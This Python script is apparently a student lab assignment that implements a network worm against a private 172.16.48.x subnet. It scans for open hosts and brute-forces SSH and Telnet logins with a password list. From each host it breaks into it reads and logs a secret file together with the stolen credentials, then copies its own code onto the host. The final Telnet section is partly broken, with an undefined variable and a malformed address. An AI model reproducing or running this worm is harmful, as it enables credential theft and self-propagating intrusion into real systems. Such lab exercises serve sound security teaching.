import paramiko
import os
import socket
from telnetlib import Telnet
import socket
import subprocess

def connect(user, pwd, host):
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=user, password=pwd, timeout=10, banner_timeout=20, look_for_keys=False)
    print("connected")
    sftp = client.open_sftp()
    f = sftp.file("Q2secret").read().decode()

    with open('Q2secrets', 'a') as s:
        s.write(f"{host} {user} {pwd} {f}")
    
    with open('Q2worm.py', "r") as w:
        worm = w.read().encode('ascii')
        f = sftp.file("Q2worm.py", "w").write(worm + b'\n')
    client.close()

def worm2():
    cwd = os.getcwd()
    users = []
    openPorts = []

    with open(os.path.join(cwd, "Q2pwd"), "r") as f:
        for line in f:
            lineArr = line.strip().split(" ")
            users.append(lineArr)
    subnet = "172.16.48."
    for i in range(2, 256):
        print(f"checking {i}...")
        host = subnet + str(i)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((host, 80))
        if result == 0:
            openPorts.append(i)
            print(f"port {i} is open")
        sock.close()
    
    print(openPorts)
    for port in openPorts:
        host = subnet + str(port)
        for user in users:
            username = user[0]
            pwd = user[1]
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=pwd, timeout=10, banner_timeout=20, look_for_keys=False)
                print("connected")
                _stdin, _stdout,_stderr = client.exec_command("df")
                print(_stdout.read().decode())
                client.close()

            except paramiko.SSHException as e:
                print(f"Failed to connect to {host} with user {username} and password {pwd}\n")
                
            except socket.timeout:
                print(f"Connection to {host} timed out")
            except Exception as e:
                print(f"Error connecting to {host}: {e}")

def worm3():
    ports = [88, 90, 102, 120, 163, 196, 204, 240]
    cwd = os.getcwd()
    users = []
    openPorts = []
    with open(os.path.join(cwd, "Q2pwd"), "r") as f:
        for line in f:
            lineArr = line.strip().split(" ")
            users.append(lineArr)
    subnet = "172.16.48."


    for port in ports:
        host = subnet + str(port)
        bannerErrors = []
        for user in users:
            username = user[0]
            pwd = user[1]
            try:
                connect(username, pwd, host)

            except paramiko.AuthenticationException as e:
                print(f"incorect login on ip {port} using password {pwd}")

            except paramiko.SSHException as e:
                print(f"Banner Error\n")
                bannerErrors.append([port, username, pwd])
                print(bannerErrors)
            except socket.timeout:
                print(f"Connection to {host} timed out")
            except Exception as e:
                print(f"Error on {pwd}: {e}")
        while len(bannerErrors) != 0:
            for error in bannerErrors:
                host = subnet + str(error[0])

                username = error[1]
                pwd = error[2]
                try:
                    connect(username, pwd, host)
                    bannerErrors.remove(error)
                    print(bannerErrors)

                except paramiko.AuthenticationException as e:
                    bannerErrors.remove(error)

                except paramiko.SSHException as e:
                    print(bannerErrors)

worm3()

for i in range(0,256):
	ip_address = '172.16.48' + str(i)
	print(ip_address)
	for username, password in username_passwords.items():
		try:
			tn = telnetlib.Telnet(ip_address, timeout=3)
			tn.read_until(b"login: ")
			tn.write(username.encode('ascii') + b"\n")            
			tn.read_until(b"Password: ")
			tn.write(password.encode('ascii') + b"\n")
			login_output = tn.read_until(b"$", 5).decode('ascii')
			if "$" in login_output:
				print(f"Successfully logged in with username '{username}' and password '{password}'")
				tn.write(b"ls\n")
				tn.write(b"cat Q2secret\n")
				output = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
				output1 = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
				output1 = output1.strip() + '\n'
				with open('Q2wormtn.py', 'rb') as f:
					tn.write(b'cat > tmp.py\n')
					tn.write(f.read())  
					tn.write(b'\n')
				tn.write(b"exit\n")	
				secrets = open("Q2secrets", 'a')
				secrets.write(output1.strip('$'))
				secrets.close()
				break
			else:
				print(f"Failed to login with username '{username}' and pass '{password}'")
			tn.close()
		except:
			print('username', end=' ')
			print(username, end=' ')
			print('failed')